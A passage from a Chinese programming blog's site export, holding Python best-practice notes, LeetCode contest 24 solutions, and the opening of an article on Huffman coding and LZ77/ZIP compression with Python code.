dropwhile：从判定函数为False的地方开始，逐个返回元素 filterfalse：和filter相反，从迭代器中返回令判定函数为False的所有元素 把迭代器元素组合起来的函数 product：根据迭代器中的元素计算笛卡儿积，并将其返回。可以用product来改写深度嵌套的列表推导操作 permutation：排列 combination：组合 在重视精度的场合用decimal 如下面的代码，按照每分钟rate收费，但是第一个输出我们期望的是0.01，第二个是5.37： 123456def do_cost(rate, second): cost = rate * second / 60 return cost, round(cost, 2)print(do_cost(0.05, 5)) # (0.004166666666666667, 0.0)print(do_cost(1.45, 222)) # (5.364999999999999, 5.36) Decimal类中非常适合用在那种对精度要求很高，且对舍入行为要求很严的场合，如涉及货币计算： 12345678def do_cost(rate, second): rate = Decimal(str(rate)) second = Decimal(str(second)) cost = rate * second / Decimal(&#x27;60&#x27;) return cost, cost.quantize(Decimal(&#x27;0.01&#x27;), rounding=ROUND_UP)print(do_cost(0.05, 5)) # (Decimal(&#x27;0.004166666666666666666666666667&#x27;), Decimal(&#x27;0.01&#x27;))print(do_cost(1.45, 222)) # (Decimal(&#x27;5.365&#x27;), Decimal(&#x27;5.37&#x27;)) 协作开发 编写文档 Python将文档视为第一等级(first-class)对象 通过__doc__来访问文档 文档应该用三重双引号\"\"\" 为模块编写文档 每个模块都应有顶级的doctring，用来介绍当前这个模块以及模块中的内容 文档第一行为一句话，介绍本模块的用途 它下面的那段话，应该包含一些细节信息，把与本模块的操作有关内容，告诉模块使用者。可以强调本模块中比较重要的类和函数，使得开发者能据此了解该模块的用法。 12345678910#!/usr/bin/env python3&quot;&quot;&quot;Library for testing words for various linguistic patterns.Testing how words relate to each other can be tricky sometimes!This module provides easy ways to determine when words you’vefound have special properties.Available functions:- palindrome: Determine if a word is a palindrome.- check_anagram: Determine if two words are anagrams.… &quot;&quot;&quot;# … 为类编写文档 每个类都应该有类级别的doctring。 头一行也是一句话介绍该类用途 类中比较重要的public属性及方法，也应该再这个docstring里面加以强调 12345678910class Player(object): &quot;&quot;&quot;Represents a player of the game. Subclasses may override the ‘tick’ method to provide custom animations for the player’s movement depending on their power level, etc. Public attributes: - power: Unused power-ups (float between 0 and 1). - coins: Coins found during the level (integer). &quot;&quot;&quot; # … 为函数编写文档 每个函数和方法也应该有docstring 第一行为一句话描述本函数的功能 接下来为一段话用来描述具体的行为和参数。(如果函数没有参数，且有且仅有一个简单的返回绘制，那么只需要一句话来描述该函数就够了) 若有返回值，则应该再docstring中写明。如果没有返回值就不要写。 如果可能抛出某些调用者必须处理的异常，而这些异常又是函数接口的一部分，那么docstring应该对其做出解释。同样的，没有异常就不要写 如果函数接受数量可变的位置参数或数量可变的关键字参数，那么就应该再文档的参数列表中，使用*args和**kwargs来描述它们的用途 如果函数的参数有默认值，那么应该指出这些默认值 如果函数是个生成器，那么应该描述该生成器在迭代时产生的内容 如果函数时个协程，那么应该描述协程所产生的返回值，以及这个协程希望通过yield表达式来接纳的值，同时还要说明该协程何时会停止迭代 1234567891011121314def find_anagrams(word, dictionary): &quot;&quot;&quot;Find all anagrams for a word. This function only runs as fast as the test for membership in the ‘dictionary’ container. It will be slow if the dictionary is a list and fast if it’s a set. Args: word: String of the target word. dictionary: Container with all strings that are known to be actual words. Returns: List of anagrams that were found. Empty if none were found. &quot;&quot;&quot; 用包来安排模块 可以编写__all__的特殊属性，减少其暴露给外围API使用者的信息。 __all__时一个列表，其中每个名称都将作为本模块的一条公共API，导出给外部代码。 如果外部用户以from foo import *形式使用foo模块，那么只有在__all__里的那些属性才会从foo引入。如果foo没有提供__all__，那么只会引入public属性 123456# __init__.py__all__ = []from . models import *__all__ += models.__all__from . utils import *__all__ += utils.__all__ 自定义异常 好处： 调用者在使用API的时候，通过捕获根异常，可以知道他们使用的调用代码是否正确 调用者可以捕获python的Exception基类，帮助模块的研发者寻找API实现中的bug 用适当的方式打破循环依赖关系 下面的代码会出异常(AttributeError: ‘module’ object has no attribute ‘prefs’) 12345678910111213141516171819202122# dialog.pyimport appclass Dialog(object): def __init__(self, save_dir): self.save_dir = save_dir # …save_dialog = Dialog(app.prefs.get(‘save_dir’))def show(): # …# app.pyimport dialogclass Prefs(object): # …def get(self, name): # …prefs = Prefs()dialog.show() 引入模块的时候，python按照深度优先的顺序执行下列操作： 在sys.path所制定的路径中，搜寻待引入的模块 从模块中加载代码，并保证这段代码能够正确编译 创建与该模块相对应的空对象 把这个空的模块对象添加到sys.modules里 运行模块对象中的代码，定义其内容 因为某些属性必须等系统把对用的代码执行完毕之后（第5步），才具备完整的定义。因为app模块在未定义任何内容的时候就引入了dialog模块，然后dialog又引入了app模块。而app模块尚未定义完整个引入的过程，还处在引入dialog的状态之中。按照上面第4步的规则，此时的app模块只是个空壳而已。而dialog模块却需要这个prefs，就抛出了AtrributeError异常。 方法一调整引入顺序 在app模块中移动到底部。当dialog模块反向引用app时，第五步几乎执行完 了，于是dialog能找到app.prefs的定义。 但是该方法和PEP 8 风格不符（import 应该在顶部） 123456# app.pyclass Prefs(object): # …prefs = Prefs()import dialog # Moveddialog.show() 方法二 先引入、在配置、最后运行 只在模块中给出函数、类和常量的定义，而不要在引入的时候真正去运行那些函数。每个模块都将提供configure函数，等其他模块都引入完毕之后，我们在该模块上面调用一次configure，而这个函数访问其他模块的属性，以便将本模块的状态准备好。 123456789101112131415161718192021# dialog.pyimport appclass Dialog(object): # …save_dialog = Dialog()def show(): # …def configure(): save_dialog.save_dir = app.prefs.get(‘save_dir’)# app.pyimport dialogclass Prefs(object): # …prefs = Prefs()def configure(): # … 调用时： 1234567# main.pyimport appimport dialogapp.configure()dialog.configure()dialog.show() 这个方案在很多情况下都很适合，而且方便开发者实现依赖注入等模式。但是有时候很难从代码中提取configure步骤。 另外模块内部划分不同阶段，会令代码不易理解（因为把对象的定义和配置分开了） 方法三 动态引入 12345678910# dialog.pyclass Dialog(object): # …save_dialog = Dialog()def show(): import app # Dynamic import save_dialog.save_dir = app.prefs.get(‘save_dir’) # … 而app模块和最开始的一样。 一般来说，尽量不要使用这种动态引入的方案，因为import语句的执行开销，还是不小的。折中动态引入方案，还可能会在程序运行时导致非常奇怪的错误，如程序在运行很久后突然抛出SyntaxError异常。 不过这是最简单的方案，因为即可以缩减重构所花的精力，又可以尽量降低代码的复杂度。 配置虚拟环境 用pip show xxx可以看依赖那些包 比如Sphinx和flask都依赖jinja2的包，但是这个包如果发生重大变化，一个需要新版一个需要旧版那系统就没法运行了。 虚拟环境工具pyvenv工具（python3.4自带）早期python需要 pip install virtualenv，并在命令行通过virtualenv来使用 用pyvenv命令来新建名为myproject的虚拟环境，每一套虚拟环境都必须位于各自独立的目录之中（使用虚拟化环境的时候也不要去移动环境的目录）。该目录下面会产生响应的目录树与文件： 1234$ pyvenv &#x2F;tmp&#x2F;myproject$ cd &#x2F;tmp&#x2F;myproject$ lsbin include lib pyvenv.cfg 用source来运行bin/actiave脚本，该脚本修改所有环境变量，使之与虚拟环境相匹配。它还会更新命令提示符，把虚拟环境的名称包含进来，使得开发者可以明确知道自己所处的环境： 12345678$ source bin&#x2F;activate(myproject)$(myproject)$ which python3&#x2F;tmp&#x2F;myproject&#x2F;bin&#x2F;python3(myproject)$ ls -l &#x2F;tmp&#x2F;myproject&#x2F;bin&#x2F;python3… -&gt; &#x2F;tmp&#x2F;myproject&#x2F;bin&#x2F;python3.4(myproject)$ ls -l &#x2F;tmp&#x2F;myproject&#x2F;bin&#x2F;python3.4… -&gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.4 在这个环境中，除了pip和steuptools是没有安装任何软件包的。外围系统的包这里不可用。可以用pip把包安装在当前虚拟环境 使用完虚拟环境后，通过deactivate命令回到默认的系统 123(myproject)$ deactivate$ which python3&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3 用pip freeze可以把开发环境对软件包的依赖关系，保存到文件之中。按照管理，文件名为requirements.txt. 12345(myproject)$ pip3 freeze &gt; requirements.txt(myproject)$ cat requirements.txtnumpy&#x3D;&#x3D;1.8.2pytz&#x3D;&#x3D;2014.4requests&#x3D;&#x3D;2.3.0 新的环境要安装只需要 (otherproject)$ pip3 install -r /tmp/myproject/requirements.txt 部署 通过repr来输出调试信息 对内置的Python类型调用pring函数，会根据该值打印出一条易于阅读的字符串，这个字符串隐藏了类型信息。而repr函数，会根据该值返回一条可供打印的字符串。把这个repr传给内置的eval函数，就可以将其还原为初始的那个值 在格式字符串使用%s就类似str函数返回的，使用%r就和repr相符 类中可以定义__repr__方法 在任意对象上查询__dict__属性，观察其内部信息 用unitest来测试全部代码 要想确信Python程序能正常运行，唯一的办法就是编写测试。 内置的unittest是编写测试最简单的方法 如以下的代码： 12345678910111213141516171819202122# utils.pydef to_str(data): if isinstance(data, str): return data elif isinstance(data, bytes): return data.decode(&#39;utf-8&#39;) else: raise TypeError(&#39;Must supply str or bytes, &#39;&#39;found: %r&#39; % data)# utils_test.pyfrom unittest import TestCase, mainfrom utils import to_strclass UtilsTestCase(TestCase): def test_to_str_bytes(self): self.assertEqual(&#39;hello&#39;, to_str(b&#39;hello&#39;)) def test_to_str_str(self): self.assertEqual(&#39;hello&#39;, to_str(&#39;hello&#39;)) def test_to_str_bad(self): self.assertRaises(TypeError, to_str, object()) 测试是以TestCase的形式来组织的。每个以test开头的方法，都是一项测试。如果测试方法在运行过程中没有抛出任何Exception,也没有因assert语句而导致AssertionError，那么测试就算顺利通过。 TestCase类提供了一些辅助方法，以供开发者在编写测试的时候做出各种断言。如assertEqual判断两值是否相等，assertTrue判断表达式是否为真，assertRaises验证程序是否能在适当的时候抛出相关的异常。 在TestCase子类中，可以定义一些辅助方法来令测试代码更加便于阅读，只是要注意，这些辅助方法不能以test开头。 有时候运行测试方法需要在TestCase类中把测试环境配置好。于是我们就覆写setUp和tearDown方法。系统在执行每个测试之前，都会调用一次setUp方法，在执行每个测试之后，执行一次tearDown方法，这样保证各项测试独立运行。 通常把一组相关的测试放在一个TestCase中（一个模块内的所有函数），如果某函数有很多边界状况，那就针对这个函数专门编写一个TestCase子类，次外也会针对每个类来编写TestCase，来测试该类及类中的所有方法。 用pdb实现交互测试 通常写在一行，使得不用能够方便的注释 import pdb; pdb.set_trace() 先分析性能在优化 Python提供了内置的性能分析工具，可以计算出程序某个部分的执行时间在总体的执行时间中所占的比率。 采用内置的cProfile模块比profile模块好，因为对受测代码的效率只会产生很小的影响。 下面的代码测试插入排序的： 123456789101112131415161718192021222324def insert_value(array, value): for i, existing in enumerate(array): if existing &gt; value: array.insert(i, value) return array.append(value)def insertion_sort(data): result = [] for value in data: insert_value(result, value) return resultfrom random import randintmax_size = 10 ** 4data = [randint(0, max_size) for _ in range(max_size)]test = lambda: insertion_sort(data)profiler = Profile()profiler.runcall(test)stats = Stats(profiler)stats.strip_dirs()stats.sort_stats(&#x27;cumulative&#x27;)stats.print_stats() 结果如下: 1234567891011121320003 function calls in 2.288 secondsOrdered by: cumulative timencalls tottime percall cumtime percall filename:lineno(function)1 0.000 0.000 2.288 2.288 test.py:36(&lt;lambda&gt;)1 0.006 0.006 2.288 2.288 test.py:27(insertion_sort)10000 2.259 0.000 2.282 0.000 test.py:20(insert_value) 9992 0.023 0.000 0.023 0.000 &#123;method &#39;insert&#39; of &#39;list&#39; objects&#125;8 0.000 0.000 0.000 0.000 &#123;method &#39;append&#39; of &#39;list&#39; objects&#125;1 0.000 0.000 0.000 0.000 &#123;method &#39;disable&#39; of &#39;_lsprof.Profiler&#39; objects&#125; 说明如下： ncalls: The number of calls to the function during the profiling period. tottime: The number of seconds spent executing the function, excluding time spent executing other functions it calls. tottime percall: The average number of seconds spent in the function each time it was called, excluding time spent executing other functions it calls. This is tottime divided by ncalls. cumtime: The cumulative number of seconds spent executing the function, including time spent in all other functions it calls. cumtime percall: The average number of seconds spent in the function each time it was called, including time spent in all other functions it calls. This is cumtime divided by ncalls. 可以用stats.print_callers()查看该函数所消耗的执行时间究竟是哪些调用者分别引发的。 使用tracemalloc来掌握内存的使用及泄漏情况 调用内存的使用情况的第一种是内置的gc模块，让它列出垃圾收集器当前所知的每个对象。 12345678910111213141516# using_gc.pyimport gcfound_objects = gc.get_objects()print(&#x27;%d objects before&#x27; % len(found_objects))import waste_memoryx = waste_memory.run()found_objects = gc.get_objects()print(&#x27;%d objects after&#x27; % len(found_objects))for obj in found_objects[:3]: print(repr(obj)[:100])&gt;&gt;&gt;4756 objects before14873 objects after&lt;waste_memory.MyObject object at 0x1063f6940&gt;&lt;waste_memory.MyObject object at 0x1063f6978&gt;&lt;waste_memory.MyObject object at 0x1063f69b0&gt; 但是gc模块不能告诉我们这些对象是如何分配出来的。可以用tracemalloc解决（Python3.4及之后的才有） 下面的打印导致内存增大的前三个对象，可以立即看出导致内存变大的主要因素以及分配那些对象的语句在源代码中的位置。 123456789101112131415import tracemalloctracemalloc.start(10) # Save up to 10 stack framestime1 = tracemalloc.take_snapshot()import waste_memoryx = waste_memory.run()time2 = tracemalloc.take_snapshot()stats = time2.compare_to(time1, &#x27;lineno&#x27;)for stat in stats[:3]: print(stat)&gt;&gt;&gt;waste_memory.py:6: size=2235 KiB (+2235 KiB), count=29981 (+29981),average=76 Bwaste_memory.py:7: size=869 KiB (+869 KiB), count=10000 (+10000), average=89B waste_memory.py:12: size=547 KiB (+547 KiB), count=10000 (+10000), average=56B tracemalloc模块也可以打印出py在执行每一个分配内存操作时,具备的完整的堆栈信息.下面找到程中最消耗内存的那个内存分配操作,并将该操作的堆栈信息打印出来. 123456789101112§ stats = time2.compare_to(time1, &#x27;traceback&#x27;)top = stats[0]print(&#x27;\\n&#x27;.join(top.traceback.format()))&gt;&gt;&gt;File “waste_memory.py”, line 6self.x = os.urandom(100)File “waste_memory.py”, line 12obj = MyObject()File “waste_memory.py”, line 19deep_values.append(get_data())File “with_trace.py”, line 10x = waste_memory.run()","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"}]},{"title":"leetcode contest 24 solution","slug":"leetcode-contest-24-solution","date":"2017-03-19T02:40:58.000Z","updated":"2021-01-08T13:32:16.831Z","comments":true,"path":"leetcode-contest-24-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-contest-24-solution/","excerpt":"好久没刷题拉。。比赛竟然已经到24了。。。- - 题目500+了可怕 本次是contest 24的题解，按题目编号升序排列如下： Convert BST to Greater Tree 01 Matrix Diameter of Binary Tree Output Contest Matches","text":"好久没刷题拉。。比赛竟然已经到24了。。。- - 题目500+了可怕 本次是contest 24的题解，按题目编号升序排列如下： Convert BST to Greater Tree 01 Matrix Diameter of Binary Tree Output Contest Matches leetcode 538. Convert BST to Greater Tree Given a Binary Search Tree (BST), convert it to a Greater Tree such that every key of the original BST is changed to the original key plus sum of all keys greater than the original key in BST. Example: 123456789Input: The root of a Binary Search Tree like this: 5 &#x2F; \\ 2 13Output: The root of a Greater Tree like this: 18 &#x2F; \\ 20 13 BST中序遍历为升序的，因为先左子树然后中间节点，然后右子树， 这里先右子树然后中间然后左子树，累加右边的即可。 12345678910111213141516class Solution(object): def convertBST(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: TreeNode &quot;&quot;&quot; def dfs(root, val): if not root: return val right = dfs(root.right, val) root.val += right left = dfs(root.left, root.val) return left dfs(root, 0) return root leetcode 542. 01 Matrix iven a matrix consists of 0 and 1, find the distance of the nearest 0 for each cell. The distance between two adjacent cells is 1. Example 1: Input: 1230 0 00 1 00 0 0 Output: 1230 0 00 1 00 0 0 Example 2: Input: 1230 0 00 1 01 1 1 Output: 1230 0 00 1 01 2 1 Note: The number of elements of the given matrix will not exceed 10,000. There are at least one 0 in the given matrix. The cells are adjacent in only four directions: up, down, left and right. DP，设dp[i][j]为最小距离，从左上角到右下角跑一次，然后从右下角到左上角跑一次即可 123456789101112131415161718192021222324class Solution(object): def updateMatrix(self, matrix): &quot;&quot;&quot; :type matrix: List[List[int]] :rtype: List[List[int]] &quot;&quot;&quot; if not matrix: return [[]] m, n = len(matrix), len(matrix[0]) dp = [[0x7fffffff if matrix[i][j] != 0 else 0 for j in range(n)] for i in range(m)] for i in range(m): for j in range(n): self.DP(i, j, m, n, dp) for i in range(m - 1, -1, -1): for j in range(n - 1, -1, -1): self.DP(i, j, m, n, dp) return dp def DP(self, i, j, m, n, dp): if i &gt; 0: dp[i][j] = min(dp[i][j], dp[i - 1][j] + 1) if j &gt; 0: dp[i][j] = min(dp[i][j], dp[i][j - 1] + 1) if i &lt; m - 1: dp[i][j] = min(dp[i][j], dp[i + 1][j] + 1) if j &lt; n - 1: dp[i][j] = min(dp[i][j], dp[i][j + 1] + 1) Java 版本 1234567891011121314151617181920212223242526272829303132333435public class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; updateMatrix(List&lt;List&lt;Integer&gt;&gt; matrix) &#123; if (matrix.size() == 0) return null; int m = matrix.size(), n = matrix.get(0).size(); int[][] dp = new int[m][n]; for (int i = 0; i &lt; m; i++) for (int j = 0; j &lt; n; j++) if (matrix.get(i).get(j) != 0) dp[i][j] = Integer.MAX_VALUE - 1; for (int i = 0; i &lt; m; i++) for (int j = 0; j &lt; n; j++) DP(i, j, m, n, dp); for (int i = m - 1; i &gt;= 0; i--) for (int j = n - 1; j &gt;= 0; j--) DP(i, j, m, n, dp); List&lt;List&lt;Integer&gt;&gt; ans = new LinkedList&lt;&gt;(); for (int i = 0; i &lt; m; i++) &#123; List&lt;Integer&gt; cur = new LinkedList&lt;&gt;(); for (int j = 0; j &lt; n; j++) cur.add(dp[i][j]); ans.add(cur); &#125; return ans; &#125; private void DP(int i, int j, int m, int n, int[][] dp) &#123; if (i &gt; 0) dp[i][j] = Math.min(dp[i][j], dp[i - 1][j] + 1); if (j &gt; 0) dp[i][j] = Math.min(dp[i][j], dp[i][j - 1] + 1); if (i &lt; m - 1) dp[i][j] = Math.min(dp[i][j], dp[i + 1][j] + 1); if (j &lt; n - 1) dp[i][j] = Math.min(dp[i][j], dp[i][j + 1] + 1); &#125;&#125; leetcode 543. Diameter of Binary Tree Given a binary tree, you need to compute the length of the diameter of the tree. The diameter of a binary tree is the length of the longest path between any two nodes in a tree. This path may or may not pass through the root. Example: Given a binary tree 12345 1 &#x2F; \\ 2 3 &#x2F; \\ 4 5 Return 3, which is the length of the path [4,2,1,3] or [5,2,1,3]. 题目地址： 这题直接DFS即可。。 左边的长度+右边的。。 1234567891011121314151617class Solution(object): def diameterOfBinaryTree(self, root): &quot;&quot;&quot; :type root: TreeNode :rtype: TreeNode &quot;&quot;&quot; self.ans = 0 def dfs(root, cur): if not root: return cur - 1 left = dfs(root.left, cur + 1) right = dfs(root.right, cur + 1) self.ans = max(self.ans, left - cur + right - cur) return max(left, right) dfs(root, 0) return self.ans leetcode 544. Output Contest Matches During the NBA playoffs, we always arrange the rather strong team to play with the rather weak team, like make the rank 1 team play with the rank nth team, which is a good strategy to make the contest more interesting. Now, you're given n teams, you need to output their final contest matches in the form of a string. The n teams are given in the form of positive integers from 1 to n, which represents their initial rank. (Rank 1 is the strongest team and Rank n is the weakest team.) We'll use parentheses('(', ')') and commas(',') to represent the contest team pairing - parentheses('(' , ')') for pairing and commas(',') for partition. During the pairing process in each round, you always need to follow the strategy of making the rather strong one pair with the rather weak one. Example 1: 12345Input: 2Output: (1,2)Explanation: Initially, we have the team 1 and the team 2, placed like: 1,2.Then we pair the team (1,2) together with &#39;(&#39;, &#39;)&#39; and &#39;,&#39;, which is the final answer. Example 2: 1234567Input: 4Output: ((1,4),(2,3))Explanation: In the first round, we pair the team 1 and 4, the team 2 and 3 together, as we need to make the strong team and weak team together.And we got (1,4),(2,3).In the second round, the winners of (1,4) and (2,3) need to play again to generate the final winner, so you need to add the paratheses outside them.And we got the final answer ((1,4),(2,3)). Example 3: 1234567Input: 8Output: (((1,8),(4,5)),((2,7),(3,6)))Explanation: First round: (1,8),(2,7),(3,6),(4,5)Second round: ((1,8),(4,5)),((2,7),(3,6))Third round: (((1,8),(4,5)),((2,7),(3,6)))Since the third round will generate the final winner, you need to output the answer (((1,8),(4,5)),((2,7),(3,6))). Note: The n is in range [2, 212]. We ensure that the input n can be converted into the form 2k, where k is a positive integer. 每次把第一个队和最后一个队放在一起即可。。 123456789101112131415class Solution(object): def findContestMatch(self, n): &quot;&quot;&quot; :type n: int :rtype: str &quot;&quot;&quot; div = [i + 1 for i in range(n)] k = int(math.log(n, 2)) for _ in range(k): t = [] m = len(div) for i in range(m &gt;&gt; 1): t.append(&#x27;(&#x27; + str(div[i]) + &#x27;,&#x27; + str(div[m - i - 1]) + &#x27;)&#x27;) div = t return div[0] 本次是 leetcode 如下的题解 Convert BST to Greater Tree 01 Matrix Diameter of Binary Tree Output Contest Matches 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"从Huffman编码谈文件压缩","slug":"introduction-to-data-compress-huffman-code-and-lz77-and-zip","date":"2017-02-26T10:12:02.000Z","updated":"2021-01-08T13:42:14.097Z","comments":true,"path":"introduction-to-data-compress-huffman-code-and-lz77-and-zip/","link":"","permalink":"https://www.hrwhisper.me/introduction-to-data-compress-huffman-code-and-lz77-and-zip/","excerpt":"本文从大家耳熟能详的Huffman编码开始谈起，然后讨论文件的压缩。包括如下内容 Huffman编码 Huffman编码的实现（如何将解压需要用的字典信息写入文件并恢复等） LZ77算法 ZIP（deflate）算法","text":"本文从大家耳熟能详的Huffman编码开始谈起，然后讨论文件的压缩。包括如下内容 Huffman编码 Huffman编码的实现（如何将解压需要用的字典信息写入文件并恢复等） LZ77算法 ZIP（deflate）算法 Huffman编码 压缩过程 每次将频率最小的两个元素进行合并，自底向上的建树。可以用优先队列来实现。建完树后，我们可以把各个结点与左儿子的边编号为0 ，和右儿子的边编号为1， 将根节点到叶子结点上路径的编号连接起来，就是对应的Huffman编码。 WIKI百科上有一张很好的动态图： 解压 这样就完成了一棵前缀树Trie，前缀的性质也保证了一个码不会是另一个码的前缀，因此Huffman编码能被正确的解压。解压的时候只需要对于当前的bit，若为0，那么走左边，否则走右边。走到叶子结点说明该字符解码完毕，回到根节点，继续解码下一个。 代码实现 首先定义树的结点的内容，并定义了__lt__方法，便于使用堆(python中的heapq)能进行比较元素的大小 123456789class TreeNode(object): def __init__(self, val, cnt, left=None, right=None): self.cnt = cnt self.val = val self.left = left self.right = right def __lt__(self, other): return self.cnt &lt; other.cnt 接下来定义Huffman树，该类支持如下特性 从一个TreeNode的数组（list of TreeNode）中创建huffman树 除了一开始用来建树外，在之后从文件中频率信息恢复huffman树也会用到 从huffman树中获取叶子结点对应的编码 就是直接进行树的遍历即可 支持查找操作，给定一个字节('1' or '0')进行树根节点的移动 文件读取中一个字节一个字节读入时，可以用这个方便查找 123456789101112131415161718192021222324252627282930class HuffmanTree(object): def __init__(self, q): self._root = self.root = self._create_tree(q) # q is a list of TreeNode self.huffman_code = &#123;&#125; @staticmethod def _create_tree(q): heapq.heapify(q) while len(q) &gt; 1: a, b = heapq.heappop(q), heapq.heappop(q) heapq.heappush(q, TreeNode(&#x27;&#x27;, a.cnt + b.cnt, a, b)) return q.pop() def get_huffman_code(self): self._get_huffman_code(self.root) return self.huffman_code def _get_huffman_code(self, root, cur=&#x27;&#x27;): if not root.left and not root.right: # the leaf node self.huffman_code[root.val] = cur return if root.left: self._get_huffman_code(root.left, cur + &#x27;0&#x27;) if root.right: self._get_huffman_code(root.right, cur + &#x27;1&#x27;) def find(self, c): self.root = self.root.right if c == &#x27;1&#x27; else self.root.left if not self.root.left and not self.root.right: res = self.root.val self.root = self._root return res 最后时huffman编码的编码和解码过程。 编码过程 为了能够进行解码，要将最后一个字节的实际位数以及“字典”存入文件中 首先存入last_byte 紧接着存入字典的长度 接着对于每一个字符，存入该字符，然后是该字符出现频率v的二进制长度，接着是该频率v（转为二进制，按byte存） 字典存储完毕后，才是进行huffman encode的文件内容 解码过程 读入last_byte和字典的长度 根据字典的存储格式为： 字符-频率的二进制长度-频率v 进行读取，然后重新构造huffman数 对文件内容进行decode，用到上面的HuffmanTree.find方法 需要对最后一个字节特殊处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Huffman(object): @staticmethod def encode(filename, dist=None): if not dist: dist = filename + &#x27;_compressed&#x27; with open(filename) as fr, open(dist, &#x27;wb&#x27;) as f: txt = fr.read() q = [TreeNode(c, cnt) for c, cnt in collections.Counter(txt).items()] huffman_code = HuffmanTree(q[:]).get_huffman_code() txt = &#x27;&#x27;.join([huffman_code[c] for c in txt]) f.write(bytes(chr(len(txt) &amp; 7), &quot;utf-8&quot;)) # last_byte and dic_len to file f.write(bytes(chr(sum([2 + ceil(len(bin(x.cnt)[2:]) / 8) for x in q])), &quot;utf-8&quot;)) # TODO 一样长的 for x in q: c, v = x.val, bin(x.cnt)[2:] f.write(bytes(c, &quot;utf-8&quot;)) # current character f.write(bytes(chr(len(v)), &quot;utf-8&quot;)) # current code length f.write(bytes(&#x27;&#x27;.join(chr(int(v[i:i + 8], 2)) for i in range(0, len(v), 8)), &quot;utf-8&quot;)) # cnt f.write(bytes(&#x27;&#x27;.join(chr(int(txt[i:i + 8], 2)) for i in range(0, len(txt), 8)), &quot;utf-8&quot;)) # @staticmethod def decode(filename, dist=None): if not dist: dist = filename + &#x27;_decode&#x27; with open(filename, &#x27;rb&#x27;) as f: txt = f.read().decode(&#x27;utf-8&#x27;) last_byte, dic_len = ord(txt[0]), ord(txt[1]) i, huffman_code = 2, &#123;&#125; q = [] while i &lt; dic_len + 2: cur, cur_len = txt[i], ord(txt[i + 1]) bytes_num = ceil(cur_len / 8) code = &#x27;&#x27;.join([bin(ord(c))[2:].zfill(8) for c in txt[i + 2:i + 2 + bytes_num]]) if cur_len &amp; 7: code = code[:-8] + code[-(cur_len &amp; 7):] q.append(TreeNode(cur, int(code, 2))) i += bytes_num + 2 txt = &#x27;&#x27;.join([bin(ord(c))[2:].zfill(8) for c in txt[2 + dic_len:]]) if last_byte: txt = txt[:-8] + txt[-last_byte:] tree = HuffmanTree(q) with open(dist, &#x27;w&#x27;) as f: for i in range(len(txt)): c = tree.find(txt[i]) if c: f.write(c) 最后是文件调用的demo,并最后判断压缩前的文件和压缩后解压的文件是否一致，并算出压缩率。 1234567891011if __name__ == &#x27;__main__&#x27;: file_paths = [&#x27;./Aesop_Fables.txt&#x27;, &#x27;./graph.txt&#x27;] for cur_file in file_paths: h = Huffman() h.encode(cur_file) h.decode(cur_file + &#x27;_compressed&#x27;) with open(cur_file) as f, \\ open(cur_file + &#x27;_compressed_decode&#x27;) as fd, open(cur_file + &#x27;_compressed&#x27;, &#x27;rb&#x27;) as fp: print(&#x27;&#123;&#125;: compression ratio: &#123;:.4f&#125;, decode file equals original file is &#123;&#125;&#x27;.format( f.name, os.path.getsize(cur_file + &#x27;_compressed&#x27;) / os.path.getsize(cur_file), f.read() == fd.read())) huffman code小结 上面的代码实现了huffman文件压缩的编码和解码过程，但是仍有缺陷，比如字符只有1byte并不支持中文和unicode等，此外，这样将字典写入文件的方式是高效的么？主流的压缩如zip是怎么做的？ 文件压缩 我们可以看到上文中huffman编码能用来进行文件的压缩。 可以说文件压缩可以分为无损压缩和有损压缩。 有损压缩常见于视频、音频等数据，有损压缩意味着一些信息的损失，压缩后无法还原。如JPEG/MP3等 无损压缩则常用于文件压缩等必须还原的场合，所有的信息都得到保留，典型的有ZIP/PNG等。 下面将简单介绍LZ77算法，然后介绍ZIP算法。 LZ77 算法 Jacob Ziv和Abraham Lempel 两名以色列人在1977年提出，所以该算法称为LZ77。（1978年他们又改进了一下，称为LZ78） 压缩原理 Huffman编码是将出现次数多的编码尽可能的短来进行压缩，而LZ77则是另外一种思路：替换重复的内容。 在一个文件中，如果有内容是相同的话，就可以在后一块内容中做一个标记，标示和前一块的距离和相同的长度（distance,length）。（distance,length）绝大多数情况下小于重复的内容，因此文件的体积就变小了。 滑动窗口 那么，如何寻找重复的串呢？LZ77算法采用的是的滑动窗口的方法，就是只在一个大小固定的滑动窗口内的进行重复查找。 当前处理的字节开始，和滑动窗口中的每个串进行匹配，目标是找到最大的匹配。 如果当前处理的字节开始的串有匹配，就输出一个标志，表明下面的是（distance,length）信息，然后输出（distance,length） 若没有匹配，则该字符称为未匹配的字符（literal），输出该字节，然后处理下一个字节。 此外，有几点需要注意： 当匹配的长度length大于最小匹配长度才认为是一个匹配。因为有的太短，记录（distance,length）对反而增大了文件。 固定了窗口大小也就固定了distance和length所需要的位数 标准LZ77在找到重复字符串时输出三元组(length, distance, 下一个未匹配的字符)，但是ZIP中的只输出（distance,length） 解压缩的方法 每次先读一个标记为，查看是（distance,length）对还是literal。 若（distance,length），则读出相应的串并输出到当前位置 literal：读出并输出该字节 对比压缩和解压可以发现压缩时需要进行大量的匹配，而解压时工作则少了很多。这和我们日常使用中的压缩慢解压快是一样的。 ZIP算法 zip gzip zlib 关系 下面的内容引用自 How are zlib, gzip and zip related? .zip is an archive format using, usually, the Deflate compression method. The .gz gzip format is for single files, also using the Deflate compression method. Often gzip is used in combination with tar to make a compressed archive format, .tar.gz. The zlib library provides Deflate compression and decompression code for use by zip, gzip, png (which uses the zlib wrapper on deflate data), and many other applications. 可以看到，Gzip和zip都 了Deflate算法，下面将介绍这个算法。 zip算法流程 